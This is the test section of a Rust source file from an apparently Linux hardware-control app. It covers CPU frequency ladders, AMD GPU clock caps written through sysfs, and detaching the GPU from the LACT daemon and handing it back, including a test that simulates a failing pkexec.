        assert!(parse_dbus_profiles("aa{sv} 0").is_empty());
        assert!(parse_dbus_string("").is_none());
        assert!(parse_dbus_string("s not-quoted").is_none());
    }
    #[test]
    fn cpu_freq_bounds_are_ordered_when_the_cpu_reports_them() {
        if let Some((min, max)) = cpu_freq_bounds_khz() {
            assert!(min > 0);
            assert!(min < max, "{} kHz must sit below {} kHz", min, max);
        }
    }

    /// The cap travels as the card's own level index and nothing else: no path,
    /// and no level list computed on this side. That is what leaves the helper
    /// free to check the index against the table it reads itself, and what keeps
    /// "cap at level 1" from being something the app has to be trusted about.
    #[test]
    fn the_gpu_cap_travels_as_one_level_index() {
        assert_eq!(gpu_verb_args(Some(1)), vec!["gpu-clock-cap", "1"]);
        assert_eq!(gpu_verb_args(Some(0)), vec!["gpu-clock-cap", "0"]);
        assert_eq!(gpu_verb_args(None), vec!["gpu-clock-auto"]);
    }

    /// A level the card does not have is refused here, before LACT is asked to
    /// let go of the GPU. The helper refuses it too, but by then the card would
    /// already be detached, and a mistyped level would have cost the operator
    /// their daemon rather than an error message.
    #[test]
    fn a_cap_the_card_does_not_have_is_refused_before_lact_is_touched() {
        let levels = vec![
            GpuClockLevel {
                level: 0,
                freq_mhz: 200,
                active: true,
            },
            GpuClockLevel {
                level: 1,
                freq_mhz: 700,
                active: false,
            },
        ];

        // A path that does not exist is handed in on purpose: reaching LACT
        // would fail on it, so only a refusal that happens first can answer
        // with the level's own message.
        let refused = tauri::async_runtime::block_on(write_gpu_clock_cap(
            Path::new("/nonexistent/pp_dpm_sclk"),
            &levels,
            Some(9),
        ));

        assert_eq!(refused, Err("This GPU has no clock level 9".to_string()));
    }

    /// The synthesised ladder is what this AMD machine gets: `amd-pstate`
    /// publishes no discrete P-state list, so the stops are the hardware range
    /// walked in 100 MHz steps, with both exact ends kept.
    #[test]
    fn synthesised_ladder_keeps_both_hardware_ends() {
        let ladder = build_ladder(&[], 413_663, 4_291_753, Some(1_111_720));

        assert_eq!(ladder.source, "synthesised");
        assert_eq!(ladder.min_khz, 413_663);
        assert_eq!(ladder.max_khz, 4_291_753);
        assert_eq!(ladder.lowest_nonlinear_khz, Some(1_111_720));
        assert_eq!(ladder.frequencies.first().copied(), Some(413_663));
        assert_eq!(ladder.frequencies.last().copied(), Some(4_291_753));
        assert_eq!(ladder.frequencies.len(), 40);
        assert!(
            ladder.frequencies.contains(&500_000),
            "the round stops must be present"
        );
    }

    /// A machine whose driver does publish the list gets it exactly as the
    /// kernel wrote it, not re-synthesised.
    #[test]
    fn kernel_ladder_is_used_verbatim() {
        let ladder = build_ladder(
            &[vec![800_000, 1_200_000, 3_000_000]],
            400_000,
            4_000_000,
            None,
        );

        assert_eq!(ladder.source, "kernel");
        assert_eq!(ladder.frequencies, vec![800_000, 1_200_000, 3_000_000]);
    }

    /// Each policy is a cluster with its own list; the slider offers the union.
    #[test]
    fn ladder_dedups_the_union_across_policies() {
        let ladder = build_ladder(
            &[vec![800_000, 1_200_000], vec![1_200_000, 2_000_000]],
            800_000,
            2_000_000,
            None,
        );

        assert_eq!(ladder.source, "kernel");
        assert_eq!(ladder.frequencies, vec![800_000, 1_200_000, 2_000_000]);
    }

    /// A maximum that already sits on a step must not appear twice.
    #[test]
    fn a_round_maximum_is_not_duplicated() {
        let ladder = build_ladder(&[], 413_663, 4_000_000, None);

        assert_eq!(ladder.frequencies.last().copied(), Some(4_000_000));
        assert_eq!(
            ladder
                .frequencies
                .iter()
                .filter(|f| **f == 4_000_000)
                .count(),
            1
        );
        assert!(ladder.frequencies.windows(2).all(|pair| pair[0] < pair[1]));
    }

    /// A range that is a single frequency collapses to a single stop.
    #[test]
    fn a_single_frequency_ladder_collapses_to_one_stop() {
        let ladder = build_ladder(&[], 2_000_000, 2_000_000, None);

        assert_eq!(ladder.frequencies, vec![2_000_000]);
    }

    /// No cpufreq node at all reports 0/0: that must offer no stops rather than
    /// a slider whose only value is zero.
    #[test]
    fn absent_bounds_produce_no_stops() {
        let ladder = build_ladder(&[], 0, 0, None);

        assert!(ladder.frequencies.is_empty());
        assert_eq!(ladder.source, "synthesised");
    }

    /// A fake GPU sysfs directory: the four id files and a directory named after
    /// the PCI slot, which is the one part of LACT's id that cannot be invented.
    fn fake_gpu_tree(name: &str) -> PathBuf {
        let root = std::env::temp_dir().join(format!(
            "thinkpro-vantage_lact_id_{}_{}",
            std::process::id(),
            name
        ));
        let device = root.join("0000:05:00.0");
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&device).expect("create the fake GPU tree");
        for (file, value) in [
            ("vendor", "0x1002\n"),
            ("device", "0x1638\n"),
            ("subsystem_vendor", "0x17aa\n"),
            ("subsystem_device", "0x5095\n"),
        ] {
            std::fs::write(device.join(file), value).expect("write an id file");
        }
        device
    }

    /// A fake GPU clock directory: the two nodes this app reads and writes.
    ///
    /// `pp_dpm_sclk` carries the level table, `power_dpm_force_performance_level`
    /// the forced mode — the second one is what the watcher reads to decide
    /// whether the ceiling it saved is still in force, and it is a plain file on
    /// any real machine.
    fn fake_clock_tree(name: &str, table: &str, force: Option<&str>) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "thinkpro-vantage_gpu_clock_{}_{}",
            std::process::id(),
            name
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("create the fake GPU clock tree");
        std::fs::write(dir.join("pp_dpm_sclk"), table).expect("write the level table");
        if let Some(force) = force {
            std::fs::write(dir.join("power_dpm_force_performance_level"), force)
                .expect("write the forced mode");
        }
        dir
    }

    /// The three-level table this machine's iGPU prints, uncapped.
    const REAL_SCLK: &str = "0: 200Mhz *\n1: 700Mhz\n2: 1800Mhz\n";

    /// The watcher's one question, over a fake tree.
    ///
    /// `manual` is what the app leaves behind and what everything else replaces:
    /// an `lactd` restart puts `low` back over it, which is exactly the drift the
    /// ceiling is lost to, and no amount of reading `pp_dpm_sclk` would show it —
    /// the table it prints is the same either way.
    #[test]
    fn a_ceiling_is_in_force_only_while_the_forced_mode_holds_it() {
        let held = |name: &str, force: Option<&str>, cap: u32| {
            let dir = fake_clock_tree(name, REAL_SCLK, force);
            let in_force = gpu_cap_in_force(&dir.join("pp_dpm_sclk"), cap);
            let _ = std::fs::remove_dir_all(&dir);
            in_force
        };

        assert!(held("manual", Some("manual\n"), 1));
        assert!(!held("low", Some("low\n"), 1), "LACT took the level back");
        assert!(!held("auto", Some("auto\n"), 1));
        assert!(
            !held("missing", None, 1),
            "with no forced-mode node there is nothing holding a ceiling"
        );
        assert!(
            !held("stale", Some("manual\n"), 9),
            "a saved level this GPU does not offer is no ceiling at all"
        );
    }

    /// Which column the ceilings are read from, over the two inputs that decide
    /// it.
    ///
    /// This is the mapping the single-value ceiling had no equivalent of: every
    /// source read the same level there, and the two battery columns were one.
    #[test]
    fn the_source_comes_from_mains_and_the_profile() {
        assert_eq!(gpu_source(true, "performance"), GpuPowerSource::Ac);
        assert_eq!(
            gpu_source(true, "power-saver"),
            GpuPowerSource::Ac,
            "the source is what the machine is plugged into, not the mode it is in"
        );
        assert_eq!(gpu_source(false, "power-saver"), GpuPowerSource::Sav);
        assert_eq!(gpu_source(false, "balanced"), GpuPowerSource::Bat);
        assert_eq!(
            gpu_source(false, ""),
            GpuPowerSource::Bat,
            "a profile nobody could read is on battery, not in the saver column"
        );
    }

    /// The saver column matches on the id the profile switch writes, so the two
    /// cannot drift apart.
    #[test]
    fn the_saver_profile_is_one_the_app_switches_to() {
        assert!(POWER_PROFILES.contains(&SAVER_PROFILE));
    }

    /// A ceiling is held for a source, not for the GPU.
    ///
    /// `power_dpm_force_performance_level` reads `manual` for any level-list
    /// write, so the record of what this app wrote is the only thing that says
    /// which column is on the card. A machine that has moved from mains to
    /// battery has to write again, even though the forced mode never changed —
    /// that is the whole feature.
    #[test]
    fn a_ceiling_holds_only_for_the_source_it_was_written_for() {
        let dir = fake_clock_tree("per_source", REAL_SCLK, Some("manual\n"));
        let sclk = dir.join("pp_dpm_sclk");

        assert!(gpu_ceiling_holds(
            &sclk,
            Some((GpuPowerSource::Ac, 2)),
            GpuPowerSource::Ac,
            2
        ));
        assert!(
            gpu_ceiling_holds(
                &sclk,
                Some((GpuPowerSource::Bat, 0)),
                GpuPowerSource::Bat,
                0
            ),
            "level 0 is a ceiling like any other, and it is the battery one"
        );
        assert!(
            !gpu_ceiling_holds(&sclk, Some((GpuPowerSource::Ac, 2)), GpuPowerSource::Bat, 0),
            "the machine moved to battery: the mains ceiling is not this source's"
        );
        assert!(
            !gpu_ceiling_holds(&sclk, Some((GpuPowerSource::Bat, 0)), GpuPowerSource::Ac, 0),
            "the same level under another source is still another column"
        );
        assert!(
            !gpu_ceiling_holds(&sclk, None, GpuPowerSource::Ac, 2),
            "nothing written yet is not a ceiling in force"
        );

        let _ = std::fs::remove_dir_all(&dir);

        let reverted = fake_clock_tree("per_source_revert", REAL_SCLK, Some("low\n"));
        assert!(
            !gpu_ceiling_holds(
                &reverted.join("pp_dpm_sclk"),
                Some((GpuPowerSource::Ac, 2)),
                GpuPowerSource::Ac,
                2
            ),
            "LACT re-applied its own level: the ceiling is lost whatever the record says"
        );
        let _ = std::fs::remove_dir_all(&reverted);
    }

    /// A release only ever follows a write this app made.
    ///
    /// Getting this wrong is what would make the release dangerous: it would
    /// take a card from another writer. The record is `Some` only after a
    /// successful write by this app, so a source holding no ceiling and a card
    /// nobody here wrote to is left alone.
    #[test]
    fn a_release_needs_a_ceiling_this_app_wrote_for_another_source() {
        assert!(gpu_release_needed(
            Some((GpuPowerSource::Ac, 2)),
            GpuPowerSource::Bat
        ));
        assert!(
            !gpu_release_needed(Some((GpuPowerSource::Bat, 0)), GpuPowerSource::Bat),
            "the record names the source in force: what is on the card was asked for"
        );
        assert!(
            !gpu_release_needed(None, GpuPowerSource::Bat),
            "no write of this app's is on the card, so there is no claim to give up"
        );
    }

    /// The id has to come out in the exact shape lactd names devices with, since
    /// that is the argument `detach_gpu` and `reattach_gpu` are addressed with.
    #[test]
    fn the_lact_device_id_is_built_the_way_lact_names_devices() {
        let device = fake_gpu_tree("shape");

        assert_eq!(
            lact_device_id(&device.join("pp_dpm_sclk")).as_deref(),
            Some("1002:1638-17AA:5095-0000:05:00.0")
        );

        let _ = std::fs::remove_dir_all(device.parent().unwrap());
    }

    /// Half an id would address the wrong device, so a missing file has to yield
    /// no id at all.
    #[test]
    fn an_incomplete_gpu_tree_yields_no_id() {
        let root = std::env::temp_dir().join(format!(
            "thinkpro-vantage_lact_id_{}_bare",
            std::process::id()
        ));
        let device = root.join("0000:05:00.0");
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&device).expect("create the bare tree");
        std::fs::write(device.join("vendor"), "0x1002\n").expect("write one id file");

        assert!(lact_device_id(&device.join("pp_dpm_sclk")).is_none());

        let _ = std::fs::remove_dir_all(&root);
    }

    /// The PCI slot is what names the device. LACT's formatting around it is not
    /// a contract: a version that changes case must not make a GPU it is still
    /// managing look like one it has let go of.
    #[test]
    fn devices_match_on_their_pci_slot_not_on_lact_formatting() {
        let id = "1002:1638-17AA:5095-0000:05:00.0";

        assert!(same_pci_slot(id, id));
        assert!(same_pci_slot(id, "1002:1638-17aa:5095-0000:05:00.0"));
        assert!(!same_pci_slot(id, "1002:1638-17AA:5095-0000:06:00.0"));
        assert!(!same_pci_slot(id, "1002:1638-17AA:5095"));
    }

    /// A card lactd lists is a card lactd writes; one missing from the list is
    /// one it has been told to leave, which is the state this app creates.
    #[test]
    fn a_card_lactd_lists_is_a_card_lactd_owns() {
        let managed = vec!["1002:1638-17AA:5095-0000:05:00.0".to_string()];
        let id = "1002:1638-17AA:5095-0000:05:00.0";

        assert_eq!(owner_from_listing(&managed, id), GpuOwner::Lact);
        assert_eq!(owner_from_listing(&[], id), GpuOwner::ThinkPro);
    }

    /// The view switches on these strings, so renaming a state here would turn
    /// it into "unknown" there with nothing else failing.
    #[test]
    fn the_owner_states_serialise_the_way_the_view_reads_them() {
        let name = |owner: GpuOwner| serde_json::to_string(&owner).expect("serialises");

        assert_eq!(name(GpuOwner::Uncontested), "\"uncontested\"");
        assert_eq!(name(GpuOwner::Lact), "\"lact\"");
        assert_eq!(name(GpuOwner::ThinkPro), "\"thinkpro\"");
        assert_eq!(name(GpuOwner::Unknown), "\"unknown\"");
    }

    /// The takeover against the real machine, which is the only place the two
    /// questions this exists to answer can be answered: does a level written
    /// through the app's own path survive the daemon managing the same node, and
    /// does the app still cap the card when that daemon is not there?
    ///
    /// Ignored by default. It needs an amdgpu and up to two minutes of wall clock,
    /// and it no longer needs root: the write goes out through `pkexec` to the
    /// helper, which the polkit rule grants without a password. Run it twice, as:
    ///
    /// ```text
    /// cargo test --lib -- --ignored --nocapture the_gpu_takeover
    /// systemctl stop lactd && cargo test --lib -- --ignored --nocapture the_gpu_takeover
    /// ```
    ///
    /// With lactd running, the assertions are the takeover: LACT administers the
    /// card, this app detaches it, the cap holds past LACT's timer, and clearing
    /// the ceiling hands the card back. With no lactd socket there is nothing to
    /// take and nothing to hold past — the point of that run is that the cap still
    /// lands, with no error about a daemon that is not there.
    ///
    /// Either way it hands the machine back: clearing the ceiling also returns the
    /// GPU to LACT, which re-applies its own level to it.
    ///
    /// The AppHandle-free core of each command is called directly —
    /// `apply_gpu_clock_level`, `write_gpu_clock_cap` and `hand_back_to_lact`, the
    /// three the commands themselves call. What that leaves out is the settings
    /// write, which needs a running app: `the_gpu_ceilings_round_trip_through_the_settings_file`
    /// and `an_old_settings_file_with_clock_limits_still_loads` in
    /// [`crate::settings`] cover that side.
    #[test]
    #[ignore = "writes sysfs and needs a real GPU"]
    fn the_gpu_takeover_holds_the_ceiling_and_hands_it_back() {
        let Some((sclk, levels)) = gpu_sclk_and_levels() else {
            eprintln!("no amdgpu clock node on this machine, so there is nothing to take");
            return;
        };
        // The socket is the whole difference between the two runs above.
        let lactd = lact::Client::detect();
        eprintln!(
            "lactd socket: {}",
            if lactd.is_some() { "there" } else { "absent" }
        );
        let id = lact_device_id(&sclk).expect("the GPU has an id");
        let mut sorted = levels.clone();
        sorted.sort_by_key(|level| level.level);
        assert!(
            sorted.len() >= 2,
            "a ceiling below the top needs two levels"
        );

        let read = |path: &Path| {
            fs::read_to_string(path)
                .unwrap_or_default()
                .trim()
                .to_string()
        };
        let manages = |client: &lact::Client| {
            client
                .gpu_ids()
                .map(|ids| ids.iter().any(|known| same_pci_slot(known, &id)))
                .unwrap_or(false)
        };
        let force = gpu_force_level_path(&sclk);
        let cap = sorted[1].level;

        eprintln!("before: force level = {:?}", force.as_deref().map(read));
        eprintln!("before: sclk = {:?}", read(&sclk));
        if let Some(client) = &lactd {
            eprintln!("before: lactd manages this GPU = {}", manages(client));
            assert!(
                manages(client),
                "LACT has to be managing it for this to prove anything"
            );
        }

        let capped = tauri::async_runtime::block_on(apply_gpu_clock_level(GpuPowerSource::Ac, cap));
        eprintln!("cap at level {cap}: {capped:?}");
        assert!(capped.is_ok(), "the cap was refused: {:?}", capped.err());
        if let Some(client) = &lactd {
            assert!(
                !manages(client),
                "lactd still manages the GPU, so it can still overwrite the level"
            );
        }
        if let Some(force) = &force {
            // A leftover `low` is what pins the GPU to its lowest level; `manual`
            // is the state a level list can hold in. This is where that is
            // checked instead of assumed.
            assert_eq!(
                read(force),
                "manual",
                "a leftover force level would keep the cap from holding"
            );
        }

        // LACT applies its own level on a timer, which is what makes a write that
        // ignored it decay. Holding past the timer is the point of the run with
        // lactd there; with no lactd socket there is no timer to hold past.
        if let Some(client) = &lactd {
            std::thread::sleep(Duration::from_secs(70));
            eprintln!("after 70s: force level = {:?}", force.as_deref().map(read));
            eprintln!("after 70s: sclk = {:?}", read(&sclk));
            eprintln!("after 70s: lactd manages this GPU = {}", manages(client));
            if let Some(force) = &force {
                assert_eq!(
                    read(force),
                    "manual",
                    "the level was written over while capped"
                );
            }
            assert!(
                !manages(client),
                "lactd took the GPU back while it was capped"
            );
        }

        // What `clear_gpu_clock_cap` does with no settings store to write to:
        // every level enabled, the force level back to auto, then the hand-back.
        let cleared = tauri::async_runtime::block_on(async {
            let (sclk, levels) =
                gpu_sclk_and_levels().expect("the clock node is still there to read");
            let message = write_gpu_clock_cap(&sclk, &levels, None).await?;
            hand_back_to_lact(&sclk).map(|_| message)
        });
        eprintln!("clear: {cleared:?}");
        assert!(
            cleared.is_ok(),
            "the ceiling was not removed: {:?}",
            cleared.err()
        );
        if let Some(client) = &lactd {
            assert!(manages(client), "the GPU was not handed back to LACT");
        }
        eprintln!(
            "after clear: force level = {:?}",
            force.as_deref().map(read)
        );
    }

    /// Arm D, replayed on this machine: a ceiling written through the app's own
    /// path is gone once `lactd` restarts, and the watcher's pass is what puts it
    /// back.
    ///
    /// Ignored like the takeover test above, and for the same reasons: it needs an
    /// amdgpu and a running lactd, and it takes the GPU away from LACT for the
    /// length of the run before handing it back.
    ///
    /// It runs as the invoking user. That is the point of routing the write
    /// through the helper: the whole run is a sequence of passwordless privileged
    /// writes now, and a run that could only pass as root would not be testing the
    /// path the app actually takes.
    ///
    /// ```text
    /// cargo test --lib -- --ignored --nocapture the_lost_cap_comes_back
    /// ```
    ///
    /// Phase one is the failure at the level it happens — a level written here,
    /// `systemctl restart lactd`, and the ceiling gone with nothing in this
    /// process to bring it back. Phase two is the watcher's pass,
    /// [`reassert_gpu_clock`], the function [`gpu_clock_watcher`] calls on every
    /// tick. Phase three is the pass after that, which must write nothing: it is
    /// the ordinary case the loop spends its life in, and the one that has to stay
    /// free of detach calls and of writes.
    #[test]
    #[ignore = "writes sysfs and needs a real GPU and a running lactd"]
    fn the_lost_cap_comes_back() {
        let Some((sclk, levels)) = gpu_sclk_and_levels() else {
            eprintln!("no amdgpu clock node on this machine, so there is no cap to lose");
            return;
        };
        let Some(client) = lact::Client::detect() else {
            eprintln!("no lactd socket on this machine, so there is no daemon to restart");
            return;
        };
        let id = lact_device_id(&sclk).expect("the GPU has an id");
        let read = |path: &Path| {
            fs::read_to_string(path)
                .unwrap_or_default()
                .trim()
                .to_string()
        };
        let force = gpu_force_level_path(&sclk);
        let manages = || {
            client
                .gpu_ids()
                .map(|ids| ids.iter().any(|known| same_pci_slot(known, &id)))
                .unwrap_or(false)
        };

        let mut sorted = levels.clone();
        sorted.sort_by_key(|level| level.level);
        assert!(sorted.len() >= 2, "a cap below the top needs two levels");
        let cap = sorted[1].level;

        // The GPU half of `set_gpu_clock_level`: the same call, without the
        // settings write that needs a running app.
        let capped = tauri::async_runtime::block_on(apply_gpu_clock_level(GpuPowerSource::Ac, cap));
        eprintln!("cap at level {cap}: {capped:?}");
        assert!(capped.is_ok(), "the cap was refused: {:?}", capped.err());
        assert!(
            gpu_cap_in_force(&sclk, cap),
            "the level landed but the forced mode does not hold it"
        );
        eprintln!(
            "capped: force = {:?}, lactd manages the GPU = {}",
            force.as_deref().map(read),
            manages()
        );

        // -- phase one: the failure this watcher exists for --
        let restart = Command::new("sudo")
            .args(["-n", "systemctl", "restart", "lactd"])
            .status()
            .expect("sudo -n systemctl restart lactd runs");
        assert!(restart.success(), "lactd did not restart: {restart}");

        // Long enough for the daemon to come back and apply its own level, and
        // longer than the watcher's interval: if the app were watching this GPU
        // the ceiling would be back by now, and that is the point of the phase —
        // this process is not the app, and nothing here re-applies anything.
        std::thread::sleep(Duration::from_secs(3 * GPU_POLL_INTERVAL.as_secs()));
        eprintln!(
            "arm D, after the restart: force = {:?}, cap in force = {}",
            force.as_deref().map(read),
            gpu_cap_in_force(&sclk, cap)
        );
        assert!(
            !gpu_cap_in_force(&sclk, cap),
            "the replay no longer reproduces the failure: lactd did not take the level back"
        );

        // -- phase two: the watcher's pass --
        let start = std::time::Instant::now();
        let reasserted =
            tauri::async_runtime::block_on(reassert_gpu_clock(GpuPowerSource::Ac, cap));
        eprintln!("re-assert: {reasserted:?} in {:?}", start.elapsed());
        assert!(
            matches!(reasserted, Ok(Some(_))),
            "the watcher's pass did not re-apply the lost cap: {reasserted:?}"
        );
        assert!(gpu_cap_in_force(&sclk, cap), "the cap is not back");
        assert!(!manages(), "lactd can still overwrite the level");

        // -- phase three: the pass with nothing to do --
        let idle = tauri::async_runtime::block_on(reassert_gpu_clock(GpuPowerSource::Ac, cap));
        eprintln!("idle pass: {idle:?}");
        assert!(
            matches!(idle, Ok(None)),
            "the pass after a re-apply must write nothing: {idle:?}"
        );
        assert!(
            gpu_cap_in_force(&sclk, cap),
            "the idle pass changed the GPU"
        );

        // Machine as it was: every level enabled, no forced mode, LACT's card.
        let restored = tauri::async_runtime::block_on(async {
            let (sclk, levels) = gpu_sclk_and_levels().expect("the clock node is there");
            write_gpu_clock_cap(&sclk, &levels, None).await?;
            hand_back_to_lact(&sclk)
        });
        eprintln!("restore: {restored:?}");
        assert!(
            restored.is_ok(),
            "the machine was left capped: {restored:?}"
        );
        eprintln!(
            "restored: force = {:?}, lactd manages the GPU = {}",
            force.as_deref().map(read),
            manages()
        );
    }

    /// A privileged write that fails must not leave the GPU detached from LACT.
    ///
    /// The failure is made rather than hoped for. `run_helper` resolves `pkexec`
    /// by name, so a refusing `pkexec` first on `PATH` is the same failure the app
    /// would see if the write could not go through -- and it is the shape of
    /// failure this branch was added for: the take succeeds, the write does not,
    /// and the card is left belonging to neither writer.
    ///
    /// Ignored like the others: it needs an amdgpu and a running lactd, and it
    /// takes the GPU from LACT for the length of the run before handing it back.
    ///
    /// ```text
    /// cargo test --lib -- --ignored --exact \
    ///   performance::tests::a_failed_write_hands_the_gpu_back_to_lact
    /// ```
    #[test]
    #[ignore = "needs a real GPU and a running lactd"]
    fn a_failed_write_hands_the_gpu_back_to_lact() {
        use std::os::unix::fs::PermissionsExt;

        let Some((sclk, levels)) = gpu_sclk_and_levels() else {
            eprintln!("no amdgpu clock node on this machine, so there is no write to fail");
            return;
        };
        let Some(client) = lact::Client::detect() else {
            eprintln!("no lactd socket on this machine, so there is no detach to undo");
            return;
        };
        let id = lact_device_id(&sclk).expect("the GPU has an id");
        let manages = || {
            client
                .gpu_ids()
                .map(|known| known.iter().any(|entry| same_pci_slot(entry, &id)))
                .unwrap_or(false)
        };
        assert!(
            manages(),
            "the run has to start with LACT administering the card"
        );

        let mut sorted = levels.clone();
        sorted.sort_by_key(|level| level.level);
        assert!(sorted.len() >= 2, "a cap below the top needs two levels");
        let cap = sorted[1].level;

        let stubs = std::env::temp_dir().join(format!(
            "thinkpro-vantage_failing_pkexec_{}",
            std::process::id()
        ));
        std::fs::create_dir_all(&stubs).expect("create the stub directory");
        let refusing = stubs.join("pkexec");
        std::fs::write(
            &refusing,
            "#!/bin/sh\necho 'simulated privileged write failure' >&2\nexit 1\n",
        )
        .expect("write the stub");
        std::fs::set_permissions(&refusing, std::fs::Permissions::from_mode(0o755))
            .expect("make the stub executable");

        let path = std::env::var("PATH").unwrap_or_default();
        std::env::set_var("PATH", format!("{}:{}", stubs.display(), path));
        let refused =
            tauri::async_runtime::block_on(apply_gpu_clock_level(GpuPowerSource::Ac, cap));
        std::env::set_var("PATH", path);
        let _ = std::fs::remove_dir_all(&stubs);

        eprintln!("forced failure: {refused:?}");
        assert!(
            refused.is_err(),
            "the refusing pkexec did not fail the write: {refused:?}"
        );

        let forced = gpu_force_level_path(&sclk)
            .map(|path| fs::read_to_string(path).unwrap_or_default())
            .unwrap_or_default();
        eprintln!("after the failure: force = {:?}", forced.trim());
        assert_ne!(
            forced.trim(),
            "manual",
            "the failed write left the card in a forced mode"
        );
        assert!(
            manages(),
            "a failed write left the GPU detached from LACT as well"
        );
    }
}
